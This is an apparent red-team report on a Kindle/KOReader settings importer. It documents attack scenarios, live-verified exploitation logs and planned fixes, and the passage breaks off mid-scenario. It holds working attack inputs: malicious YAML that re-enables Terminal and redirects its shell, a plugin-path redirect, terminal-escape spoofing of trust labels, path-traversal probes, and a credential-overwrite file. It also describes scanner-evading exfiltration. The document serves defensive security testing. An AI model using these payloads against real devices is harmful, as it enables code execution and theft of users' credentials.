# 96 — Red-team session v0.11.1 + hardening plan

> **This file has been split into 5 smaller documents for easier navigation:**
>
> | File | Lines | Contents |
> |------|-------|----------|
> | [96a-findings-core.md](96a-findings-core.md) | ~1660 | S1–S51: core session findings |
> | [96b-findings-extended.md](96b-findings-extended.md) | ~1330 | S52–S67, S9–S30 re-assessments |
> | [96c-findings-probes.md](96c-findings-probes.md) | ~1430 | S68–S88: automated probe findings |
> | [96d-hardening.md](96d-hardening.md) | ~1210 | §2–§9: defenses, threat model, hardening plan |
> | [96e-koreader-live.md](96e-koreader-live.md) | ~270 | §10–§11: completeness battery, emulator |
>
> **Load 96d when implementing fixes** (contains §8 hardening plan with code refs).
> **Load 96a/96b/96c when auditing** a specific finding by S-number.
> This original file is kept as the canonical archive.

### *Adversarial testing of the W32/W34e/W36 defense stack and the gaps it left open*

Date: 2026-04-23.
Scope: scenarios S1–S3 against the import pipeline post-W32+W34e+W36+W37.
Companion: docs/87 (threat model), docs/88 (SENSITIVE gate), docs/89
(plugin hashes), docs/93 (scanner spec), docs/95 (community inventory).

---

## 1. Scenarios run

### S1 — catalog-impersonation, trivial (pre-session)
Folder named `ssh.koplugin` shipping an unrelated payload. Under
`--strict-imports`, W34e's MISMATCH verdict blocks. **Already defended.**

### S2 — obfuscated shell via `_G["os"]["execute"]`
Uncatalogued `evilbackup.koplugin`. Resolves `os.execute` through the
`_G` global table with computed string keys, avoiding the literal
`os.execute` token the scanner regex expects.

**Defender (blind agent) verdict:** refused — but partly on the plugin
name alone ("evilbackup" too obvious). The lexical bypass itself was
not detected by the scanner.

**Defense path:** `--strict-imports` blocks uncatalogued plugins at the
W34e integrity gate before scanner fires. Without `--strict-imports`,
scanner returns clean and plugin lands.

### S2-prime — S2 with a catalogued folder name
Same payload, renamed to `bookshortcuts.koplugin` (real catalog entry).
Pre-fix state: entry had `known_hashes: null`, so W32 verified nothing.
Verdict was UNVERIFIED, which the old `--strict-imports` gate allowed
through (it only blocked MISMATCH/UNCATALOGUED). **Full bypass
confirmed.**

Fixed in commit `e8ce545`:
- (A) Populated `known_hashes` for all 37 bundled plugins (script:
  `scripts/extract-plugin-hashes.ts`).
- (B) Tightened `--strict-imports` to reject every non-MATCH verdict
  (UNVERIFIED and MALFORMED_STRUCTURE included).

Post-fix re-run: `STRICT_IMPORT_BLOCKED` with `[MISMATCH] bookshortcuts`.
Attack path closed.

### S4 — patch-in-MATCH (catastrophic, survives full strict mode)

Fat `.kset` ships `bookshortcuts.koplugin` **verbatim from the KOReader
source tree** (hashes MATCH the bundled catalog exactly) alongside a
single patch file `patches/2-analytics-hook.lua`. The patch uses the
same `string.char` byte-table trick from S3 to evade the scanner, then
reads `settings.reader.lua` and POSTs it on first boot.

Run with the **maximum-paranoia flag combo**:
`--accept-plugins --accept-patches --strict-imports`

Output:

```
plugins (2 file(s), 6.6 KB):
    bookshortcuts.koplugin  (2 file(s), 6.6 KB)
  patches (1 file(s), 1.1 KB):
    2-analytics-hook.lua  (1.1 KB)
  scanner: 1 file(s) scanned, 2 suppressed by catalog — no novel findings
…
✓ installed 2 plugin file(s) → <mount>/koreader/plugins
✓ installed 1 patch(es) → <mount>/koreader/patches
EXIT: 0
```

Plugin passes BUNDLED_MATCH cleanly. Patch bypasses the scanner. Ships
to `/koreader/patches/`, runs on KOReader boot with full plugin
privilege.

**This is worse than S3** because:

- S3 required the user to skip `--strict-imports`. Safety-conscious
  users were safe.
- S4 succeeds **under full strict mode**. The most paranoid flag combo
  still imports the payload.
- The output actively misleads: *"no novel findings"* reads as an
  all-clear. It is not.
- The threat model assumption "BUNDLED_MATCH plugin = trusted bundle"
  is violated by a side-car file that bypasses the catalog entirely.

**Root cause.** Patches are outside the trust system. No catalog (by
design — patches are user-authored). W34e integrity gate only checks
plugins. Scanner is the sole gate for patches and is evadable (see S3).

**Mitigations that would actually work:**

1. Patches render as *"user-vouched code, kindly cannot verify"* always
   — scanner output never implies clean.
2. Under `--strict-imports`, patches require explicit per-file hash
   pinning (`--expect-patch-hash <sha256>`). Strict = strict.
3. Patches quarantined on install: land under `patches/.pending/` or
   with disabled-sentinel filename. User renames manually to activate.
   KOReader loads from `patches/*.lua` only, so rename-to-activate
   neutralizes the attack until the user acts.
4. SENSITIVE-class gate for any patch (same bar as
   `extra_plugin_paths` in settings — `--accept-sensitive` required).

**Severity.** Critical — pre-fix, kindly provides *no* defense against
this attack. The scanner-as-advisory rebrand (W39) is not enough:
patches need their own trust tier.

#### S4 — live verification on KOReader-on-macOS (2026-04-23)

Promoted from static claim to observed behavior. Same environment as
S17 (KOReader built from source on macOS, launched with `KO_HOME`
pointed at a kindly-written fixture).

**Kindly side.** Fat `.kset` shipping BUNDLED-hash-matching
`bookshortcuts.koplugin` + a byte-table-obfuscated
`patches/2-analytics-hook.lua`. Imported under the maximum-paranoia
flag combo:

```
$ kindly setup import bookshortcuts-pack.kset --mount <fixture> \
    --accept-plugins --accept-patches --strict-imports

this Setup ships executable code:
  plugins (2 file(s), 6.6 KB):
    bookshortcuts.koplugin  (2 file(s), 6.6 KB)
  patches (1 file(s), 1.7 KB):
    2-analytics-hook.lua  (1.7 KB)
  Lua code in plugins and patches will execute on your Kindle.
  Verify the author before accepting.
  scanner: 1 file(s) scanned, 2 suppressed by catalog — no novel findings
…
✓ installed 2 plugin file(s) → <mount>/koreader/plugins
✓ installed 1 patch(es)       → <mount>/koreader/patches
EXIT: 4  (warnings only — the single warning is `refresh_rate` schema
         drift, unrelated to the patch)
```

**KOReader side.** Launched against the post-import fixture. Marker
file appeared **3 seconds** after launch — well within the window
before first UI interaction.

**Evidence captured.**

- `/tmp/kindly-s4-live/s4-marker.txt` contents:
  `S4 patch executed on KOReader boot\n1776965616` (unix ts =
  2026-04-23 20:33:36 EEST).
- Local TCP listener at `127.0.0.1:4242` received
  `POST /s4 HTTP/1.1` with the settings.reader.lua body attached.
  (Listener responded 501 — handler only implements GET — but the
  request line confirms transit.)
- Installed patch on disk: `<fixture>/koreader/patches/2-analytics-hook.lua`
  (1733 bytes, matches manifest hash).

**What this confirms.**

1. The scanner's byte-table detection is **evadable in production**,
   not just in theory. The exact same `string.char({…})` trick from S3
   passes `--strict-imports` with a "no novel findings" all-clear.
2. Patches have no trust tier today: BUNDLED_MATCH signals on the
   plugin side do not cover the side-car patch.
3. Once installed, KOReader loads patches at boot with full plugin
   privilege. No further user action is required after import —
   zero interaction from acceptance to code-exec.
4. The scanner output (`no novel findings`) actively misleads the
   careful user. The pre-install advisory ("Lua code will execute on
   your Kindle. Verify the author before accepting.") is the only
   trust-boundary hint — and an attacker controls the `meta.name`
   field displayed next to it.

**Implication for the v0.11.2 hardening list (§8).** The four
mitigations listed in the static S4 writeup above are all load-bearing
post-live-run:

- Rebrand scanner output as advisory (W39) so "no novel findings"
  stops reading as "safe".
- Under `--strict-imports`, require `--expect-patch-hash <sha256>`
  per-file. Strict should mean strict.
- Quarantine patches on install (e.g. `patches/.pending/` + manual
  rename-to-activate), so import alone does not arm the patch.
- SENSITIVE-class gate for any patch unless hash-pinned.

Harness: `scripts/koreader-roundtrip.sh` with
`KINDLY_FLAGS="--accept-plugins --accept-patches --strict-imports"`
and `AUTORUN_SEED` at priority 9 (so the attacker patch at priority 2
runs first). Fixture at `/tmp/kindly-s4-live/`. Reproducible.

---

### S7 — terminal escape injection in manifest identity fields

Fat `.kset` with a hand-crafted `manifest.yaml`. Hand-authoring
bypasses the canonical-form re-export step. Fields set to:

```yaml
meta:
  name: harmless-pack
  author: "Jane Doe \e[32m✓ VERIFIED\e[0m"
  source_url: "https://github.com/real/repo\e[2K\r  source:       https://trusted.org/official-mirror"
  description: "Reading stats helper.\n\n\e[1A\e[2K  \e[32m✓ all scanner checks passed\e[0m"
```

YAML double-quoted scalars support `\e` → `\x1b`, so the parser
preserves the escape codes. `setup inspect` writes these to stdout
verbatim (`src/commands/setup.ts:279-288`). `od -c` on raw output
confirmed the ESC bytes flow through untouched.

On a real TTY the output renders as:

```
author:       Jane Doe ✓ VERIFIED (UNVERIFIED)
  source:       https://trusted.org/official-mirror (UNVERIFIED)
  description:  Reading stats helper.
                ✓ all scanner checks passed
```

- Green "✓ VERIFIED" next to the author name drowns out the dim
  `(UNVERIFIED)` trailer visually.
- `\e[2K\r` after the real GitHub URL clears the line and reprints a
  spoofed "trusted.org" URL — the real URL is literally erased from
  the display.
- `\e[1A\e[2K` in `description` lets the attacker move up a line and
  wipe a warning the reviewer was meant to see.

A `warn:` line about non-canonical form does fire (because hand-edited
manifest ≠ canonical serialization), but it appears several lines
below the forged "verified" claims and a motivated attacker can
produce a canonical-form YAML that silences it.

**Severity.** Alone: medium — still requires the user to accept
plugins. In combination with S4: **pristine-looking attack** where
every rendered field shows green. The combination is the real threat.

**Mitigations:**

1. Sanitize all string-typed manifest fields before stdout — strip or
   reject control characters (`< 0x20` except `\n`/`\t`) and the C1
   range. Same bar as `git log --sanitize`.
2. Render `author` / `source_url` / `description` on their own lines
   with enforced max length so `\r` rewrites and line-up-and-clear
   sequences cannot cross the `(UNVERIFIED)` trailer.
3. In `--json` mode this is moot (JSON escapes), so the same
   sanitization should apply to the text renderer only, mirroring
   how `git` handles this surface.

---

### S3 — scanner evasion via byte-table assembly
Uncatalogued `readingstats.koplugin`. All dangerous strings
(`socket.http`, the settings path, the exfil URL) constructed at
runtime from `string.char(<numeric table>)` helpers. Reads
`settings.reader.lua` on `:init` (2s delay) and POSTs it over plain HTTP.

Scanner sweep: **zero findings, 2 files scanned, 2789 B**. Every regex
in `src/setup/luaScan.ts` misses:
- `os.execute` / `io.popen` — no literals
- `require("socket"|…)` — allowlist is literal-only; `require(var)`
  does not match any pattern
- `load\s*\(<non-literal>` — no `load(` call
- `io.open\s*\(abs,["'][waW+]` — write-mode only; the attack uses `"r"`

**Defender (blind agent) verdict:** caught it — but by extracting the
`.kset`, reading `main.lua` by eye, and **manually decoding the byte
tables with Python**. Their own summary: *"Kindly never said 'fine'.
The review is what caught it, not the scanner."*

A real user running `setup import … --accept-plugins` (no strict) would
have seen: scanner clean, one UNCATALOGUED advisory (fires for every
community plugin, noisy), plugin installed. Exit 4. Pwned on reboot.

The spec (docs/93 §2.2) already names this class of evasion as
out-of-scope:

> *Obfuscation bypasses. `_G["os"]["execute"]`, string-built call
> names, `load(string.char(...))`, base-N encoded bodies. Any of these
> defeat lexical scanning. The backstop is the reviewer and the W32
> catalog hash.*

S3 confirmed the spec's trust model is defeated in practice: the
reviewer only catches it if they're already paranoid, and W32 doesn't
help when the plugin is uncatalogued to begin with.

#### S3 — live verification on KOReader-on-macOS (2026-04-23)

Promoted from static claim to observed behavior.

**Kindly side.** Fat `.kset` with an uncatalogued
`readingstats.koplugin` whose `main.lua` contains byte-table-
obfuscated exfil inside `Plugin:init()` with a 2s `scheduleIn`.
Imported with `--accept-plugins` only (no strict mode needed):

```
$ kindly setup import readingstats-pack.kset --mount <fixture> \
    --accept-plugins

this Setup ships executable code:
  plugins (2 file(s), 2.2 KB):
    readingstats.koplugin  (2 file(s), 2.2 KB)
  Lua code in plugins and patches will execute on your Kindle.
  Verify the author before accepting.
warn: Plugin hash verification:
  readingstats.koplugin: UNCATALOGUED (not in bundled catalog — cannot verify)
…
✓ installed 2 plugin file(s) → <mount>/koreader/plugins
EXIT: 4  (warnings only — the UNCATALOGUED advisory, no policy block)
```

No scanner complaint — byte-table obfuscation passed. Only gate was
the UNCATALOGUED advisory, which fires for every community plugin
and thus reads as noise rather than signal.

**KOReader side.** Plugin loaded during reader construction; `:init`
fired, scheduled the 2s callback. Marker file appeared **4 seconds**
after launch.

**Evidence captured.**

- `/tmp/kindly-s3-live/s3-marker.txt`:
  `S3 plugin executed on KOReader boot\n1776966274` (unix ts =
  2026-04-23 20:44:34 EEST).
- Local TCP listener at `127.0.0.1:5353` received
  `POST /s3 HTTP/1.1` **with 14,351 bytes of real settings body**.
  First 120 bytes of captured payload:
  `-- ./settings.reader.lua\nreturn {\n    ["BookShortcuts_directory_action"] = "FM",\n    ["LocalSend_last_update_check"] = 1…`.
  Listener responded 200.
- Installed plugin on disk: `<fixture>/koreader/plugins/readingstats.koplugin/{_meta.lua,main.lua}`,
  hashes match manifest.

**What this confirms.**

1. The scanner's regex set misses byte-table assembly of dangerous
   strings, verified against production kindly. None of the `os.execute`,
   `io.popen`, literal `require("socket…")`, `load(`, or
   `io.open(abs, ["waW+]"` patterns fire.
2. `Plugin:init()` is a reliable boot-time code-exec surface. No user
   menu interaction — plugins are loaded when the reader widget
   constructs.
3. Actual settings data exfiltration works — PINs, Wi-Fi credentials,
   kosync tokens, directory paths all in the captured body. This is
   not a theoretical information disclosure.
4. `--accept-plugins` alone is code-exec. The UNCATALOGUED advisory is
   not a blocker and is frequency-desensitized.

**Implication for v0.11.2 (§8).** Two things:

- Rebrand scanner output (W39) so "zero findings" stops reading as
  "safe" — consistent with the S4 implication.
- Consider a community tier gate: under `--strict-imports`, require
  per-plugin hash pinning (`--expect-plugin-hash <name=sha256>`) the
  same way S4 needs per-patch pinning. Catalog membership alone
  isn't the right bar; reproducible-by-hash is.

Harness: `scripts/koreader-roundtrip.sh` with
`KINDLY_FLAGS="--accept-plugins"` and `TIMEOUT_SECONDS=30`. Fixture at
`/tmp/kindly-s3-live/`. Reproducible.

---

### S8 — archive path-traversal / symlink (defended, for the record)

Built three probe archives:
- `../../etc/passwd` declared in manifest
- POSIX-absolute `/etc/passwd` declared in manifest
- symlink `bookshortcuts.koplugin/link → /etc/passwd` embedded alongside
  declared plain files

All three rejected at the archive-unpack layer:

- `src/fs/paths.ts` `isSafeRelativePath()` rejects null bytes, absolute
  paths, Windows drive letters, backslashes, and any `..` segment.
- `src/setup/unpack.ts` pre-scans entry paths *before* extraction,
  requires exactly one `manifest.yaml` at root, then for every other
  entry requires it to be declared in the manifest (declared-or-reject).
- `lstatSync` check explicitly rejects symlinks — even if the manifest
  declared them, the file-type guard fires first.
- Every declared file is then hash-verified against `manifest.plugins.files`.

**Verdict:** W34b holds. No action.

---

### S17 — lean `.kset` chain: re-enable Terminal + point shell at payload

**Highest-impact finding of the session.** Combines S9 with the
`plugins_disabled` re-enable surface. Lean manifest (no fat archive,
no `--accept-plugins` flag needed):

```yaml
kindly_setup: v1
apply_mode: additive
meta:
  name: terminal-quickstart
  description: Enables Terminal plugin and pre-configures the shell path for convenience.
settings:
  plugins_disabled:
    terminal: false
  terminal_shell: /mnt/us/.pwn/evil.sh
  refresh_rate: 8
```

Why the re-enable works: `PluginsSchema` only lets the author declare
plugins to *disable* (`plugins.disabled: [...]`). But `settings:` is a
permissive `z.record(z.string(), SettingValueSchema)`
(`src/setup/schema.ts:135`) — so the attacker simply writes
`plugins_disabled` directly as a settings key, with per-plugin `false`
values. `mergeYamlIntoLua`'s shallow-merge for nested dicts makes this
a per-plugin flip rather than a dict replacement, exactly what the
attacker wants.

End-to-end:

```
$ kindly setup import terminal-quickstart.kset.yaml --mount /path/to/kindle
EXIT: 4
importing terminal-quickstart (ca94bf51b78f)
  description:  Enables Terminal plugin and pre-configures the shell path for convenience.
warn: schema: 1 unknown key(s) — likely typos or plugin-scoped:
  - refresh_rate  (value is number)
3 change(s) to apply:
  ~ plugins_disabled.terminal  true → false
  + refresh_rate  = 8
  ~ terminal_shell  "/bin/ash" → "/mnt/us/.pwn/evil.sh"
✓ imported to /path/to/kindle/koreader/settings.reader.lua
```

The only warning shown is about the decoy `refresh_rate` typo. The
real changes (`plugins_disabled.terminal` flip, `terminal_shell`
overwrite) scroll past as plain diff entries with no SENSITIVE
framing. Exit 4 reads as "completed with minor warnings."

User opens Terminal from the tools menu → KOReader does
`C.execlp(shell, …)` with the attacker's path
(`plugins/terminal.koplugin/main.lua:249`). Payload runs with full
KOReader privilege.

**Severity.** **High.** No fat archive, no `--accept-plugins`, no
`--accept-sensitive`. Just a plain `.kset.yaml` file emailed,
Airdropped, or hosted on a forum. The user runs one `kindly setup
import` command with no flags and the exploit is armed — triggers on
their first Terminal-menu tap.

**Root cause (two compounding misses):**

1. `terminal_shell` is not in `SENSITIVE_KEYS` (S9's finding).
2. `plugins_disabled` itself is not in `SENSITIVE_KEYS` — re-enabling a
   privileged plugin via a settings-layer bypass of `PluginsSchema`
   should be at least as gated as `extra_plugin_paths`. Re-enabling
   Terminal is code-exec on first use; re-enabling SSH (via the same
   trick: `plugins_disabled.SSH: false`) starts a network service.
   Both should gate.

**Mitigations.**

1. Add `terminal_shell` to `SENSITIVE_KEYS` (domain `code-exec`).
2. Add `plugins_disabled` to `SENSITIVE_PATHS` as a whole-dict flag
   when any value is `false` — i.e. any plugin re-enable should fire
   the gate, since the schema intended only the disable direction.
   Alternative: reject `plugins_disabled` as a raw settings key during
   manifest validation and force authors through `plugins.disabled`.
3. Rework the diff renderer so flips of keys KOReader uses for
   code-exec / service-start land under a prominent section, not
   interleaved with benign diffs at the same visual weight.

**This is the strongest case for W39's flag-flip** (scanner-advisory
+ strict-by-default for plugin-relevant imports). It also argues that
the SENSITIVE class should extend to any settings-layer write that
*turns on* a privileged KOReader subsystem, not just ones that
redirect endpoints.

**S17b — SSH-only variant (even quieter):**

```yaml
settings:
  plugins_disabled:
    SSH: false
```

Output:

```
1 change(s) to apply:
  ~ plugins_disabled.SSH  true → false
EXIT: 0
```

Exit 0, no warnings. User's explicit "I disabled SSH" choice is
reverted with zero visible trail. The same shape re-enables any
built-in plugin the user had disabled: `httpinspector`, `LocalSend`,
`calibre`, `SSH`, `terminal`, etc. Every one of those is a network-
or code-exec-adjacent service. This confirms `plugins_disabled` flips
in the *enable* direction belong under SENSITIVE unconditionally.

#### S17 — live verification on KOReader-on-macOS (2026-04-23)

Promoted from static claim to observed behavior. Environment: KOReader
built from source on macOS (SDL3), launched against a fixture data dir
via `KO_HOME`. Setup per `docs/98-koreader-emulator-setup.md`.

**Kindly side.** Lean `.kset.yaml` with two settings changes, imported
with zero flags:

```
$ kindly setup import terminal-behavior.kset.yaml --mount <fixture>
2 change(s) to apply:
  ~ plugins_disabled.terminal  true → false
  ~ terminal_shell  "/bin/sh"  → "/tmp/pwn.sh"
EXIT: 4  (warnings only — no SENSITIVE prompt, no policy block)
```

No `--accept-sensitive`, no `--accept-key`, no warning mentioning
shell, Terminal, or execution. The import lands both keys.

**KOReader side.** Fresh launch reads the post-import settings; user
opens Tools → Terminal. KOReader's own log (verbatim):

```
04/23/26-20:13:13 DEBUG Terminal: resolution= 58x35
04/23/26-20:13:13 DEBUG Terminal: slave_pty /dev/ttys005
04/23/26-20:13:13 INFO  Terminal: spawning shell /tmp/pwn.sh
```

**Evidence captured.**

- Local TCP listener (`nc -l 4242`) received:
  `S17-RCE: claw@Busuiocs-MacBook-Air.local Thu Apr 23 20:13:13 EEST 2026`
- Marker file on disk: `/tmp/s17-pwned.txt` with the same timestamp.
- PTY allocated (`/dev/ttys005`) — attacker's script got a real TTY,
  not a sandboxed exec, so any follow-on interaction is possible.

**What this confirms.**

1. `terminal_shell` is not in `SENSITIVE_KEYS` today. Import is silent.
2. `plugins_disabled.terminal = false` (re-enable direction) is not
   gated. A user who had explicitly disabled Terminal gets it turned
   back on with no prompt.
3. The one-tap gap is real: with Terminal plugin enabled, the
   "Start a new session" menu entry executes `terminal_shell`
   directly. No further user input required beyond opening the menu.
4. The macOS POSIX-PTY path (`grantpt`/`unlockpt`/`/dev/ptmx`)
   works — same code path as on a Kindle. No platform-specific
   mitigation blocks this on-device.

**Implication for the v0.11.2 hardening list (§8).** Both keys are
correctly scoped:

- Add `terminal_shell` to `SENSITIVE_KEYS` (arbitrary-path code-exec).
- Gate `plugins_disabled.*` flips from `true → false` as SENSITIVE
  when the plugin is in a network/code-exec tier (terminal, SSH,
  httpinspector, LocalSend, calibre).

Harness: `scripts/koreader-roundtrip.sh`, fixture at
`/tmp/kindly-s17-live/`. Reproducible.

---

### S38 — `kindly apply` bypasses the SENSITIVE gate entirely (new finding, live-verified)

**New attack class not previously enumerated.** Every scenario S1–S37
assumed the attacker ships a `.kset` / `.kset.yaml` through
`kindly setup import`. W31 / W32 / W34e / W36 all live on that path.
But kindly has a second, older entry point — `kindly apply --file
<yaml>` — which merges plain YAML straight into `settings.reader.lua`.
That path has **no SENSITIVE gate, no plugin catalog, no scanner**,
and prints no advisory about code execution.

**The attacker file.** Six lines of plain YAML. No manifest, no
`kindly_setup: v1`, no `apply_mode`, no author field. Shareable on
any forum ("here's my reading setup, drop this in `kindly.yaml`"):

```yaml
# Reading setup shared by a friend on r/kindle.
# Just a few preferences — drop into kindly.yaml and apply.

refresh_rate: 8
plugins_disabled:
  terminal: false
terminal_shell: /tmp/kindly-s38-live/probe.sh
```

**Kindly side.** `kindly apply --mount <fixture> --file
friend-shared.yaml` prints a bare change list and exits 0. No
mention of Terminal, shell, executable code, or trust. Compare to
the S17 `setup import` which at least emits a change summary with
"Lua code in plugins and patches will execute" on manifests that
carry code:

```
$ kindly apply --mount /tmp/kindly-s38-live/fixture --file friend-shared.yaml
2 change(s) to apply:
  ~ plugins_disabled.terminal  true → false
  ~ terminal_shell  "/bin/sh"  → "/tmp/kindly-s38-live/probe.sh"
EXIT: 0
```

`apply` doesn't even get the "settings carry SENSITIVE keys" warning
that `setup import` emits. The W31 detector
(`collectSensitiveFromSettings`) is wired into the setup pipeline
only; `src/commands/apply.ts` merges YAML via `mergeYamlIntoLua` and
writes. The fact that `terminal_shell` will exec on first Terminal
tap is invisible to the apply path.

**KOReader side.** Fresh launch, patches dir seeded with a priority-2
userpatch that broadcasts `TerminalStart`; Terminal plugin catches
the event and execs `terminal_shell`. KOReader's own log (verbatim):

```
Applying patch: /tmp/kindly-s38-live/fixture/koreader/patches/2-autorun.lua
s38-autorun: broadcasting TerminalStart
Terminal: spawning shell /tmp/kindly-s38-live/probe.sh
```

(The autorun patch is harness scaffolding — it substitutes for a
user tapping Tools → Terminal, which would have the same effect. It
is NOT part of the attacker's YAML. The YAML's damage is entirely in
`plugins_disabled.terminal=false` + `terminal_shell=<path>`.)

**Evidence captured.**

- `/tmp/kindly-s38-live/s38-marker.txt`:
  `2026-04-23T18:03:31Z S38 kindly-apply terminal_shell fired (via plain YAML, no setup manifest)`.
- Local TCP listener at `127.0.0.1:6262` received
  `GET /s38?ts=2026-04-23T18:03:31Z HTTP/1.1` 200.
- Marker appeared **7 seconds** after KOReader launch (5s schedule
  for autorun + ~2s for KOReader init).

**What this confirms.**

1. The W31 SENSITIVE gate — the architectural centerpiece of v0.11.1
   — is scoped to `setup import`. `apply` has no equivalent. A user
   who pastes a friend's YAML into `kindly.yaml` and runs
   `kindly apply` bypasses the entire trust boundary.
2. Every SENSITIVE-key attack from this red-team (S9, S17, S18, S27,
   directory-redirection cluster) re-applies through the `apply`
   path with **strictly worse** advisory output — setup import at
   least prints a change list with `[code-exec]` / `[ssh]` /
   `[network]` tags on sensitive keys; apply prints the same diff
   shape without those tags.
3. Shared YAML is the realistic distribution channel. `.kset`
   requires kindly-specific tooling; plain `kindly.yaml` is what
   every screenshot in the README shows. Forums, Reddit, Gist links
   — all normalize to "here's my YAML, run apply".
4. The dry-run surface is also worse. `kindly apply --dry-run`
   prints the bare change list with **zero** advisory lines for
   `terminal_shell` or `plugins_disabled.terminal`. `setup import
   --dry-run` at least emits the "Lua code will execute" notice
   when plugins/patches are present.

**Implication for v0.11.2 (§8).** Adds a new minimum-hardening item:

- **8.6 Share the SENSITIVE detector between `apply` and `setup
  import`.** Extract `collectSensitiveFromSettings` (or its apply-
  relevant subset) into a shared helper; run it over the post-merge
  settings diff in `src/commands/apply.ts`. On hit, require
  `--accept-sensitive` just like setup does. Without this, every
  other 8.x fix (adding `terminal_shell` to SENSITIVE_KEYS, plugin-
  re-enable SENSITIVE, *_dir cluster) is only half-applied — the
  apply path stays silent.

This should arguably be the **top** 8.x item, since it's the
broadest surface and the cheapest fix: one shared helper, two call
sites. Every other 8.x SENSITIVE-keys addition then automatically
applies to both paths.

Harness: dedicated `/tmp/kindly-s38-live/run.sh` (not the shared
roundtrip harness — S38 uses `apply` directly). Priority-2 autorun
uses `UIManager:broadcastEvent(Event:new("TerminalStart"))` to
dispatch to the Terminal plugin without user menu interaction.
Fixture at `/tmp/kindly-s38-live/`. Reproducible.

---

### S42 — `apply` + `extra_plugin_paths` = universal plugin injection (live-verified, worse than S38)

**Follow-up to S38. Confirms the `apply` path is broadly naked, not
just around `terminal_shell`.** W31a (docs/88 §4.3, memoized
elsewhere) pins `extra_plugin_paths` behind a **dual gate** under
`setup import`: the user must pass *both* `--accept-sensitive` (or
`--accept-key=extra_plugin_paths`) *and* `--accept-plugins`, because
the key redirects KOReader's plugin loader to an attacker-chosen
filesystem directory. Under `apply`, there is no gate at all.

**The attacker file.** Plain YAML, shareable verbatim:

```yaml
# Reading setup shared by a friend on r/kindle.
refresh_rate: 8
extra_plugin_paths: /tmp/kindly-s42-live/evil-plugins
```

**The attacker plugin** (not shipped in the YAML — sits on the
filesystem at the path the YAML points to; attacker delivers it via
any file-drop, bookmarklet, companion script, or the same Gist as
the YAML):

```
/tmp/kindly-s42-live/evil-plugins/s42evil.koplugin/
    main.lua   — WidgetContainer:extend; Plugin:init schedules beacon
    _meta.lua
```

No obfuscation needed — there is no scanner on this code path.

**Kindly side.** `kindly apply --dry-run` and full apply both print
**one line**:

```
$ kindly apply --mount /tmp/kindly-s42-live/fixture --file friend-shared.yaml
1 change(s) to apply:
  + extra_plugin_paths  = "/tmp/kindly-s42-live/evil-plugins"
✓ applied to .../settings.reader.lua
warn: restart KOReader (or your Kindle) for changes to take effect.
EXIT: 0
```

No `[code-exec]`, no `--accept-plugins` required, no `--accept-
sensitive` required, no mention that KOReader will `dofile`
arbitrary Lua from the new directory. Compare with the `setup
import` path, which refuses even `--accept-sensitive` alone and
demands the dual flag combo.

**KOReader side.** Fresh launch with `KO_HOME=<fixture>`. Plugin
loader (`frontend/pluginloader.lua:140-162`) reads
`extra_plugin_paths`, `lfs.attributes` directory check, scans for
`*.koplugin`, `dofile` every `main.lua`. KOReader log (verbatim):

```
04/23/26-21:15:34 INFO  Looking for plugins in directory: plugins
04/23/26-21:15:34 INFO  Looking for plugins in directory: /tmp/kindly-s42-live/evil-plugins
04/23/26-21:15:34 INFO  s42evil: init fired — extra_plugin_paths load path reached
04/23/26-21:15:36 INFO  s42evil: marker written + beacon sent
```

**Evidence captured.**

- `/tmp/kindly-s42-live/s42-marker.txt`:
  `2026-04-23T18:15:36Z S42 extra_plugin_paths plugin executed (via plain YAML, no setup manifest, no catalog)`.
- Listener at `127.0.0.1:7373` received
  `GET /s42?ts=2026-04-23T18:15:36Z HTTP/1.1` 200.
- Marker appeared **4 seconds** after KOReader launch.

**What this confirms (in addition to S38).**

1. The `apply`-path bypass is not a corner case of `terminal_shell`
   and `plugins_disabled`. It generalizes: **every SENSITIVE key is
   flattened to a one-line diff under `apply`**, including the
   dual-gated `extra_plugin_paths`.
2. S42 is the **strongest attacker primitive in the red-team so
   far.** Worse than S3 (which needs a fat `.kset` and at minimum
   `--accept-plugins`). Worse than S4 (which needs `.kset` +
   `--accept-patches`). Worse than S17 (which still needs Terminal
   reachable and a user tap). S42 needs: plain YAML + an arbitrary
   filesystem path with a plugin dir. That's it.
3. The plugin doesn't have to go through the archive-unpack checks
   (W34b) either, because it was never in the archive. `.kset`'s
   declared-or-reject hash verification is entirely bypassed.
4. The `setup import` path's dual-gate refinement (W31a) is load-
   bearing — and it protects *zero* users who take the apply path.

**Implication for v0.11.2 (§8.6 upgrade).** The shared SENSITIVE
detector (proposed in §8.6 based on S38) must include the *same*
dual-gate semantics as setup — not just `--accept-sensitive`. For
`extra_plugin_paths` specifically, the apply-path gate must require
both `--accept-sensitive` (or `--accept-key=extra_plugin_paths`) and
`--accept-plugins`. Any fix that only wires a single-accept flag
into apply re-opens S42.

Harness: dedicated `/tmp/kindly-s42-live/run.sh`. Fixture at
`/tmp/kindly-s42-live/`. Plugin dir at
`/tmp/kindly-s42-live/evil-plugins/s42evil.koplugin/`. Reproducible.

---

### S43 — `apply` has no SECRET filter (overwrite + stdout leak, live-verified)

**Third apply-path naked finding. Rounds out S38/S42.** `src/schema/
classify.ts` defines a SECRET denylist (PINs, Wi-Fi/Calibre/Zlib
credentials, kosync token). That filter is wired into the
*pull-side* (`filterForYaml` scrubs SECRETs on the way *out* to
YAML) and into `setup import` (`src/lib/importSetup.ts:544` strips
SECRETs from incoming manifests). **`src/lib/apply.ts` has none of
this wiring.** Plain path: `readFileSync(yaml) → yamlToLua →
mergeYamlIntoLua → safeWrite`. The renderer
(`src/commands/apply.ts:91-100`) prints `fmt(c.prev) → fmt(c.next)`
with no classify lookup either.

Two sub-attacks, both from one plain YAML:

**S43a — credential overwrite.** Attacker's YAML carries attacker-
controlled values for SECRET keys. Apply lands them.

**S43b — credential leak via stdout.** The diff renderer reads the
victim's CURRENT plaintext SECRETs off-device and prints them in
the `~ key  "prev" → "next"` lines. Any user who screenshots,
`tee`s, pastes into a bug report, pipes to `--json`, or even just
leaves the terminal scrollback visible has self-exfiltrated.

**The attacker file.** Realistic-looking "reading setup" YAML:

```yaml
# Reading setup shared on r/kindle. Drop into kindly.yaml and apply.
refresh_rate: 8
calibre_wireless_password: "attacker-calibre-0000"
zlibrary_username: "attacker@evil.test"
zlibrary_password: "attacker-zlib-pw"
pinpadlock_pin_code: "0000"
pinpadlock_message: "Reward if returned. Call +00 555 999 8888"
LocalSend_pin: "999999"
kosync:
  userkey: "attacker-controlled-kosync-token"
  username: "attacker_kosync"
```

**Kindly side — S43b (dry-run stdout):**

```
$ kindly apply --mount <fixture> --file friend-shared.yaml --dry-run
9 change(s) to apply:
  ~ LocalSend_pin  "551234" → "999999"
